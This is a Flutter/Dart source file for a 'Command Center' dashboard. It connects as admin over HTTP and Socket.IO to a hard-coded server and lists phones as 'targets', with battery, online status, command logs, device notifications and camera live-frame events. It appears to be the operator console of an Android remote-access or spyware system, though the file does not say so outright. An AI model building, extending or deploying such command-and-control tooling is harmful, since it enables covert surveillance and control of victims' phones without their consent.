import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'dart:ui';
import 'package:video_player/video_player.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;

class DeviceDashboardPage extends StatefulWidget {
  final String username;
  final String? sessionKey;

  const DeviceDashboardPage({
    super.key,
    this.username = 'Admin',
    this.sessionKey,
  });

  @override
  State<DeviceDashboardPage> createState() => _DeviceDashboardPageState();
}

class _DeviceDashboardPageState extends State<DeviceDashboardPage> {
  List<dynamic> _devices = [];
  bool _isLoading = true;
  Timer? _timer;
  String? _errorMessage;

  late VideoPlayerController _videoController;
  bool _videoInitialized = false;
  bool _videoError = false;

  final TextEditingController _searchController = TextEditingController();
  String _searchQuery = "";

  late IO.Socket _socket;
  bool _socketConnected = false;

  // Konfigurasi Server - SESUAI DENGAN BACKEND ANDA
  final String _baseUrl = 'http://panel-legal.jhonaley.net:3018';
  
  // Endpoint yang BENAR sesuai backend
  final String _devicesEndpoint = '/api/devices';

  String get _effectiveUsername =>
      widget.username.isNotEmpty ? widget.username : 'Admin';

  @override
  void initState() {
    super.initState();
    _initializeVideo();
    _fetchDevices();
    _initSocket();

    // Polling setiap 5 detik untuk update lastSeen
    _timer = Timer.periodic(const Duration(seconds: 5), (timer) {
      if (mounted) {
        _fetchDevicesSilent();
        setState(() {}); // Update UI untuk refresh last seen time
      }
    });

    _searchController.addListener(() {
      setState(() => _searchQuery = _searchController.text);
    });
  }

  // ============================================
  // FETCH DEVICES - ENDPOINT YANG BENAR
  // ============================================
  
  Future<void> _fetchDevices() async {
    setState(() {
      _isLoading = true;
      _errorMessage = null;
    });

    try {
      // Endpoint: GET /api/devices
      final response = await http
          .get(Uri.parse('$_baseUrl$_devicesEndpoint'))
          .timeout(const Duration(seconds: 15));

      if (response.statusCode == 200) {
        // Response format: { devices: [...] }
        final jsonData = jsonDecode(response.body);
        
        if (jsonData is Map && jsonData.containsKey('devices')) {
          final deviceList = jsonData['devices'] as List;
          
          if (mounted) {
            setState(() {
              _devices = deviceList;
              _isLoading = false;
            });
            debugPrint('[Dashboard] Loaded ${deviceList.length} devices');
          }
        } else if (jsonData is List) {
          // Fallback jika response langsung array
          if (mounted) {
            setState(() {
              _devices = jsonData;
              _isLoading = false;
            });
          }
        } else {
          if (mounted) {
            setState(() {
              _isLoading = false;
              _errorMessage = 'Format response tidak sesuai';
            });
          }
        }
      } else {
        if (mounted) {
          setState(() {
            _isLoading = false;
            _errorMessage = 'Server error: ${response.statusCode}';
          });
        }
      }
    } catch (e) {
      debugPrint('[Dashboard] Fetch error: $e');
      if (mounted) {
        setState(() {
          _isLoading = false;
          _errorMessage = 'Koneksi gagal: ${e.toString().substring(0, 50)}';
        });
      }
    }
  }

  // Silent fetch tanpa loading indicator
  Future<void> _fetchDevicesSilent() async {
    try {
      final response = await http
          .get(Uri.parse('$_baseUrl$_devicesEndpoint'))
          .timeout(const Duration(seconds: 5));

      if (response.statusCode == 200) {
        final jsonData = jsonDecode(response.body);
        
        List<dynamic> newDevices = [];
        if (jsonData is Map && jsonData.containsKey('devices')) {
          newDevices = jsonData['devices'] as List;
        } else if (jsonData is List) {
          newDevices = jsonData;
        }

        if (mounted && newDevices.isNotEmpty) {
          setState(() {
            _devices = newDevices;
          });
        }
      }
    } catch (e) {
      // Silent fail
    }
  }

  // ============================================
  // SOCKET.IO - SESUAI DENGAN BACKEND
  // ============================================
  
  void _initSocket() {
    try {
      _socket = IO.io(
        _baseUrl,
        IO.OptionBuilder()
            .setTransports(['websocket', 'polling'])
            .setQuery({
              'type': 'admin',
              'id': 'ADMIN_PANEL_${_effectiveUsername}',
            })
            .enableAutoConnect()
            // PERBAIKAN: Gunakan nilai integer besar sebagai pengganti Infinity
            // Infinity adalah konstanta JavaScript, tidak ada di Dart
            .setReconnectionAttempts(999999)
            .setReconnectionDelay(1000)
            .setReconnectionDelayMax(5000)
            .build(),
      );

      // On Connect - JOIN ADMIN ROOM
      _socket.onConnect((_) {
        debugPrint('[Dashboard] Socket Connected');
        if (mounted) setState(() => _socketConnected = true);
        
        // PENTING: Emit admin_ready untuk join room dan dapat device list
        _socket.emit('admin_ready', {
          'admin': _effectiveUsername,
          'timestamp': DateTime.now().toIso8601String(),
        });
      });

      _socket.onDisconnect((_) {
        debugPrint('[Dashboard] Socket Disconnected');
        if (mounted) setState(() => _socketConnected = false);
      });

      _socket.onConnectError((error) {
        debugPrint('[Dashboard] Socket Error: $error');
      });

      // ============================================
      // LISTEN EVENTS SESUAI BACKEND
      // ============================================

      // Event: device_list (dari admin_ready)
      _socket.on('device_list', (data) {
        debugPrint('[Dashboard] Received device_list');
        if (mounted && data != null) {
          List<dynamic> deviceList = [];
          
          if (data is List) {
            deviceList = data;
          } else if (data is Map && data.containsKey('devices')) {
            deviceList = data['devices'] as List;
          }

          if (deviceList.isNotEmpty) {
            setState(() {
              _devices = deviceList;
              _isLoading = false;
              _errorMessage = null;
            });
            debugPrint('[Dashboard] Updated ${deviceList.length} devices from socket');
          }
        }
      });

      // Event: heartbeat (dari POST /api/heartbeat/:deviceId)
      _socket.on('heartbeat', (data) {
        if (!mounted || data == null) return;
        
        try {
          Map<String, dynamic> hbData = data is Map 
              ? Map<String, dynamic>.from(data) 
              : jsonDecode(data.toString());
          
          String? deviceId = hbData['deviceId']?.toString();
          if (deviceId == null) return;

          setState(() {
            int index = _devices.indexWhere((d) => d['id']?.toString() == deviceId);
            
            if (index != -1) {
              // Update battery dan lastSeen
              _devices[index]['battery'] = hbData['battery'];
              _devices[index]['lastSeen'] = DateTime.now().toIso8601String();
              _devices[index]['status'] = 'Online';
            } else {
              // Device baru dari heartbeat, fetch ulang
              _fetchDevicesSilent();
            }
          });
        } catch (e) {
          debugPrint('[Dashboard] Heartbeat parse error: $e');
        }
      });

      // Event: new_response (dari device response)
      _socket.on('new_response', (data) {
        // Log saja, tidak perlu update device list
        debugPrint('[Dashboard] Received response for: ${data?['deviceId']}');
      });

      // Event: command_sent (log command)
      _socket.on('command_sent', (data) {
        debugPrint('[Dashboard] Command sent to: ${data?['deviceId']}');
      });

      // Event: live_frame (streaming kamera)
      _socket.on('live_frame', (data) {
        // Handle di halaman control panel, bukan di sini
      });

      // Event: new_notification
      _socket.on('new_notification', (data) {
        debugPrint('[Dashboard] New notification from: ${data?['deviceId']}');
        // Bisa ditambahkan notifikasi popup di sini
      });

      _socket.connect();
    } catch (e) {
      debugPrint('[Dashboard] Socket init error: $e');
    }
  }

  // ============================================
  // VIDEO INIT
  // ============================================
  
  void _initializeVideo() {
    try {
      _videoController = VideoPlayerController.asset('assets/videos/banner.mp4')
        ..initialize().then((_) {
          if (mounted) {
            setState(() => _videoInitialized = true);
            _videoController.setLooping(true);
            _videoController.play();
            _videoController.setVolume(0);
          }
        }).catchError((error) {
          debugPrint('[Dashboard] Video error: $error');
          if (mounted) setState(() => _videoError = true);
        });
    } catch (e) {
      if (mounted) setState(() => _videoError = true);
    }
  }

  @override
  void dispose() {
    _timer?.cancel();
    try {
      _socket.disconnect();
      _socket.dispose();
    } catch (e) {
      // Silent fail
    }
    _videoController.dispose();
    _searchController.dispose();
    super.dispose();
  }

  // ============================================
  // HELPERS
  // ============================================
  
  List<dynamic> get _filteredDevices {
    if (_searchQuery.isEmpty) return _devices;
    return _devices.where((d) {
      String searchStr = "${d['model']} ${d['id']} ${d['battery']}".toLowerCase();
      return searchStr.contains(_searchQuery.toLowerCase());
    }).toList();
  }

  bool _isDeviceReallyOnline(dynamic device) {
    // Cek status dari server dulu
    if (device['status']?.toString().toLowerCase() == 'offline') {
      return false;
    }

    // Cek lastSeen (server set offline setelah 5 menit)
    if (device['lastSeen'] != null) {
      try {
        DateTime lastSeen;
        if (device['lastSeen'] is String) {
          lastSeen = DateTime.parse(device['lastSeen']);
        } else {
          lastSeen = DateTime.fromMillisecondsSinceEpoch(device['lastSeen']);
        }
        
        // Gunakan threshold 60 detik untuk client-side
        // (Server sudah handle 5 menit)
        if (DateTime.now().difference(lastSeen).inSeconds > 60) {
          return false;
        }
        return true;
      } catch (e) {
        return device['status']?.toString().toLowerCase() == 'online';
      }
    }

    return device['status']?.toString().toLowerCase() == 'online';
  }

  String _formatLastSeen(dynamic device) {
    if (device['lastSeen'] == null) return 'Never';
    try {
      DateTime lastSeen;
      if (device['lastSeen'] is String) {
        lastSeen = DateTime.parse(device['lastSeen']);
      } else {
        lastSeen = DateTime.fromMillisecondsSinceEpoch(device['lastSeen']);
      }
      
      Duration diff = DateTime.now().difference(lastSeen);
      if (diff.inSeconds < 5) return 'Now';
      if (diff.inSeconds < 60) return '${diff.inSeconds}s ago';
      if (diff.inMinutes < 60) return '${diff.inMinutes}m ago';
      if (diff.inHours < 24) return '${diff.inHours}h ago';
      return '${diff.inDays}d ago';
    } catch (e) {
      return 'Unknown';
    }
  }

  // ============================================
  // BUILD UI
  // ============================================
  
  @override
  Widget build(BuildContext context) {
    int totalCount = _devices.length;
    int activeCount = _devices.where((d) => _isDeviceReallyOnline(d)).length;
    int offlineCount = totalCount - activeCount;
    final filteredList = _filteredDevices;

    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        children: [
          // Background Video
          if (_videoInitialized && !_videoError)
            SizedBox.expand(
              child: FittedBox(
                fit: BoxFit.cover,
                child: SizedBox(
                  width: _videoController.value.size.width.toInt() > 0 
                      ? _videoController.value.size.width 
                      : 1920,
                  height: _videoController.value.size.height.toInt() > 0 
                      ? _videoController.value.size.height 
                      : 1080,
                  child: VideoPlayer(_videoController),
                ),
              ),
            )
          else
            Container(color: const Color(0xFF0F1A15)),

          // Blur Overlay
          BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
            child: Container(color: Colors.black.withOpacity(0.6)),
          ),

          // Main Content
          SafeArea(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // Header Section
                Padding(
                  padding: const EdgeInsets.fromLTRB(20, 20, 20, 10),
                  child: Row(
                    children: [
                      Container(
                        padding: const EdgeInsets.all(10),
                        decoration: BoxDecoration(
                          color: Colors.white.withOpacity(0.1),
                          shape: BoxShape.circle,
                        ),
                        child: const Icon(Icons.security, color: Colors.greenAccent, size: 24),
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            const Text(
                              "Command Center",
                              style: TextStyle(
                                color: Colors.white,
                                fontSize: 18,
                                fontWeight: FontWeight.bold,
                                letterSpacing: 1,
                              ),
                            ),
                            Text(
                              "Device Management - ${_effectiveUsername.toUpperCase()}",
                              style: TextStyle(
                                color: Colors.white.withOpacity(0.6),
                                fontSize: 10,
                                letterSpacing: 1,
                              ),
                              overflow: TextOverflow.ellipsis,
                            ),
                          ],
                        ),
                      ),
                      const SizedBox(width: 8),
                      // Socket Status Indicator
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                        decoration: BoxDecoration(
                          color: _socketConnected
                              ? Colors.green.withOpacity(0.2)
                              : Colors.red.withOpacity(0.2),
                          borderRadius: BorderRadius.circular(10),
                          border: Border.all(
                            color: _socketConnected ? Colors.green : Colors.red,
                            width: 1,
                          ),
                        ),
                        child: Row(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            Container(
                              width: 6,
                              height: 6,
                              decoration: BoxDecoration(
                                color: _socketConnected ? Colors.green : Colors.red,
                                shape: BoxShape.circle,
                              ),
                            ),
                            const SizedBox(width: 4),
                            Text(
                              _socketConnected ? 'Live' : 'Off',
                              style: TextStyle(
                                color: _socketConnected ? Colors.green : Colors.red,
                                fontSize: 10,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ],
                        ),
                      ),
                      const SizedBox(width: 8),
                      // Refresh Button
                      GestureDetector(
                        onTap: () => _fetchDevices(),
                        child: Container(
                          padding: const EdgeInsets.all(8),
                          decoration: BoxDecoration(
                            color: Colors.white.withOpacity(0.05),
                            borderRadius: BorderRadius.circular(10),
                          ),
                          child: const Icon(Icons.refresh, color: Colors.white70, size: 20),
                        ),
                      ),
                    ],
                  ),
                ),

                // Stats Boxes
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
                  child: Row(
                    children: [
                      _buildStatBox("Total", totalCount.toString(), Colors.white),
                      const SizedBox(width: 10),
                      _buildStatBox("Online", activeCount.toString(), Colors.greenAccent),
                      const SizedBox(width: 10),
                      _buildStatBox("Offline", offlineCount.toString(), Colors.white54),
                    ],
                  ),
                ),

                // Error Message (jika ada)
                if (_errorMessage != null)
                  Padding(
                    padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
                    child: Container(
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                        color: Colors.red.withOpacity(0.1),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: Colors.red.withOpacity(0.3)),
                      ),
                      child: Row(
                        children: [
                          const Icon(Icons.warning_amber_rounded, color: Colors.red, size: 20),
                          const SizedBox(width: 12),
                          Expanded(
                            child: Text(
                              _errorMessage!,
                              style: const TextStyle(color: Colors.red, fontSize: 12),
                            ),
                          ),
                          GestureDetector(
                            onTap: () => _fetchDevices(),
                            child: Container(
                              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                              decoration: BoxDecoration(
                                color: Colors.red,
                                borderRadius: BorderRadius.circular(8),
                              ),
                              child: const Text(
                                'Retry',
                                style: TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.bold),
                              ),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),

                // Search Bar
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
                  child: Container(
                    decoration: BoxDecoration(
                      color: Colors.black.withOpacity(0.4),
                      borderRadius: BorderRadius.circular(15),
                      border: Border.all(color: Colors.white.withOpacity(0.1)),
                    ),
                    child: TextField(
                      controller: _searchController,
                      style: const TextStyle(color: Colors.white, fontSize: 14),
                      decoration: InputDecoration(
                        hintText: "Search device, ID...",
                        hintStyle: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 13),
                        prefixIcon: Icon(Icons.search, color: Colors.white.withOpacity(0.5), size: 18),
                        suffixIcon: _searchQuery.isNotEmpty
                            ? GestureDetector(
                                onTap: () {
                                  _searchController.clear();
                                  setState(() => _searchQuery = '');
                                },
                                child: Icon(Icons.clear, color: Colors.white.withOpacity(0.5), size: 18),
                              )
                            : null,
                        border: InputBorder.none,
                        contentPadding: const EdgeInsets.symmetric(vertical: 16),
                      ),
                    ),
                  ),
                ),

                const SizedBox(height: 10),

                // Device List
                Expanded(
                  child: _isLoading
                      ? const Center(
                          child: Column(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              CircularProgressIndicator(color: Colors.greenAccent),
                              SizedBox(height: 16),
                              Text(
                                "Loading devices...",
                                style: TextStyle(color: Colors.white54, fontSize: 12),
                              ),
                            ],
                          ),
                        )
                      : filteredList.isEmpty
                          ? Center(
                              child: Column(
                                mainAxisAlignment: MainAxisAlignment.center,
                                children: [
                                  Icon(Icons.devices_other, color: Colors.white.withOpacity(0.3), size: 48),
                                  const SizedBox(height: 16),
                                  Text(
                                    "NO DEVICES FOUND",
                                    style: TextStyle(
                                      color: Colors.white.withOpacity(0.5),
                                      fontWeight: FontWeight.bold,
                                      letterSpacing: 2,
                                    ),
                                  ),
                                  const SizedBox(height: 8),
                                  Text(
                                    "Waiting for targets to connect...",
                                    style: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 12),
                                  ),
                                  const SizedBox(height: 24),
                                  GestureDetector(
                                    onTap: () => _fetchDevices(),
                                    child: Container(
                                      padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
                                      decoration: BoxDecoration(
                                        color: Colors.greenAccent.withOpacity(0.1),
                                        borderRadius: BorderRadius.circular(12),
                                        border: Border.all(color: Colors.greenAccent.withOpacity(0.3)),
                                      ),
                                      child: const Row(
                                        mainAxisSize: MainAxisSize.min,
                                        children: [
                                          Icon(Icons.refresh, color: Colors.greenAccent, size: 16),
                                          SizedBox(width: 8),
                                          Text(
                                            "Refresh Now",
                                            style: TextStyle(color: Colors.greenAccent, fontSize: 13),
                                          ),
                                        ],
                                      ),
                                    ),
                                  ),
                                ],
                              ),
                            )
                          : ListView.builder(
                              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 5),
                              itemCount: filteredList.length,
                              itemBuilder: (context, index) {
                                final device = filteredList[index];
                                bool isActive = _isDeviceReallyOnline(device);
                                Color glowColor = isActive ? Colors.greenAccent : Colors.redAccent;

                                return AnimatedContainer(
                                  duration: const Duration(milliseconds: 300),
                                  margin: const EdgeInsets.only(bottom: 12),
                                  padding: const EdgeInsets.all(16),
                                  decoration: BoxDecoration(
                                    color: Colors.black.withOpacity(0.5),
                                    borderRadius: BorderRadius.circular(16),
                                    border: Border.all(
                                      color: isActive ? glowColor.withOpacity(0.3) : Colors.white12,
                                      width: 1,
                                    ),
                                    boxShadow: isActive
                                        ? [
                                            BoxShadow(
                                              color: glowColor.withOpacity(0.05),
                                              blurRadius: 15,
                                              spreadRadius: 1,
                                            )
                                          ]
                                        : [],
                                  ),
                                  child: InkWell(
                                    onTap: () {
                                      Navigator.pushNamed(
                                        context,
                                        '/control_panel',
                                        arguments: {
                                          "device": device,
                                          "operator": _effectiveUsername,
                                          "baseUrl": _baseUrl,
                                        },
                                      );
                                    },
                                    child: Row(
                                      children: [
                                        // Device Icon
                                        Container(
                                          padding: const EdgeInsets.all(12),
                                          decoration: BoxDecoration(
                                            color: isActive
                                                ? glowColor.withOpacity(0.15)
                                                : Colors.white.withOpacity(0.05),
                                            borderRadius: BorderRadius.circular(12),
                                            border: Border.all(
                                              color: isActive ? glowColor.withOpacity(0.5) : Colors.transparent,
                                            ),
                                          ),
                                          child: Icon(
                                            Icons.phone_android,
                                            color: isActive ? glowColor : Colors.white54,
                                            size: 20,
                                          ),
                                        ),
                                        const SizedBox(width: 16),

                                        // Device Info
                                        Expanded(
                                          child: Column(
                                            crossAxisAlignment: CrossAxisAlignment.start,
                                            children: [
                                              Text(
                                                device['model'] ?? "Unknown Device",
                                                style: const TextStyle(
                                                  color: Colors.white,
                                                  fontSize: 14,
                                                  fontWeight: FontWeight.bold,
                                                  letterSpacing: 0.5,
                                                ),
                                                maxLines: 1,
                                                overflow: TextOverflow.ellipsis,
                                              ),
                                              const SizedBox(height: 4),
                                              Row(
                                                children: [
                                                  // Device ID (shortened)
                                                  if (device['id'] != null) ...[
                                                    Container(
                                                      padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                                                      decoration: BoxDecoration(
                                                        color: Colors.white.withOpacity(0.05),
                                                        borderRadius: BorderRadius.circular(4),
                                                      ),
                                                      child: Text(
                                                        device['id'].toString().length > 12
                                                            ? "${device['id'].toString().substring(0, 12)}..."
                                                            : device['id'].toString(),
                                                        style: TextStyle(
                                                          color: Colors.white.withOpacity(0.4),
                                                          fontSize: 9,
                                                          fontFamily: 'monospace',
                                                        ),
                                                      ),
                                                    ),
                                                    const SizedBox(width: 8),
                                                  ],
                                                  // Admin owner
                                                  if (device['admin'] != null) ...[
                                                    Icon(Icons.person, color: Colors.white.withOpacity(0.3), size: 10),
                                                    const SizedBox(width: 2),
                                                    Text(
                                                      device['admin'].toString(),
                                                      style: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 9),
                                                    ),
                                                  ],
                                                ],
                                              ),
                                              const SizedBox(height: 2),
                                              Text(
                                                "Last seen: ${_formatLastSeen(device)}",
                                                style: TextStyle(color: Colors.white.withOpacity(0.25), fontSize: 9),
                                              ),
                                            ],
                                          ),
                                        ),

                                        // Status & Battery
                                        Column(
                                          crossAxisAlignment: CrossAxisAlignment.end,
                                          children: [
                                            Row(
                                              mainAxisSize: MainAxisSize.min,
                                              children: [
                                                Container(
                                                  width: 8,
                                                  height: 8,
                                                  decoration: BoxDecoration(
                                                    color: glowColor,
                                                    shape: BoxShape.circle,
                                                    boxShadow: [
                                                      BoxShadow(
                                                        color: glowColor.withOpacity(0.5),
                                                        blurRadius: 4,
                                                        spreadRadius: 1,
                                                      )
                                                    ],
                                                  ),
                                                ),
                                                const SizedBox(width: 6),
                                                Text(
                                                  isActive ? "Online" : "Offline",
                                                  style: TextStyle(
                                                    color: isActive ? Colors.white : Colors.white54,
                                                    fontSize: 12,
                                                  ),
                                                ),
                                              ],
                                            ),
                                            const SizedBox(height: 6),
                                            Row(
                                              mainAxisSize: MainAxisSize.min,
                                              children: [
                                                Icon(
                                                  _getBatteryIcon(device['battery']),
                                                  color: _getBatteryColor(device['battery']),
                                                  size: 12,
                                                ),
                                                const SizedBox(width: 4),
                                                Text(
                                                  "${device['battery'] ?? 0}%",
                                                  style: TextStyle(color: Colors.white.withOpacity(0.5), fontSize: 11),
                                                ),
                                              ],
                                            ),
                                          ],
                                        ),

                                        const SizedBox(width: 12),
                                        Icon(Icons.arrow_forward_ios, color: Colors.white.withOpacity(0.2), size: 14),
                                      ],
                                    ),
                                  ),
                                );
                              },
                            ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // Battery icon helper
  IconData _getBatteryIcon(dynamic battery) {
    int level = int.tryParse(battery?.toString() ?? '0') ?? 0;
    if (level > 75) return Icons.battery_full;
    if (level > 50) return Icons.battery_5_bar;
    if (level > 25) return Icons.battery_3_bar;
    if (level > 10) return Icons.battery_1_bar;
    return Icons.battery_alert;
  }

  Color _getBatteryColor(dynamic battery) {
    int level = int.tryParse(battery?.toString() ?? '0') ?? 0;
    if (level > 50) return Colors.green;
    if (level > 25) return Colors.orange;
    return Colors.red;
  }

  Widget _buildStatBox(String title, String value, Color valueColor) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 16),
        decoration: BoxDecoration(
          color: Colors.black.withOpacity(0.4),
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: Colors.white.withOpacity(0.05)),
        ),
        child: Column(
          children: [
            Text(
              value,
              style: TextStyle(color: valueColor, fontSize: 20, fontWeight: FontWeight.bold),
            ),
            const SizedBox(height: 4),
            Text(
              title,
              style: TextStyle(color: Colors.white.withOpacity(0.5), fontSize: 11, letterSpacing: 1),
            ),
          ],
        ),
      ),
    );
  }
}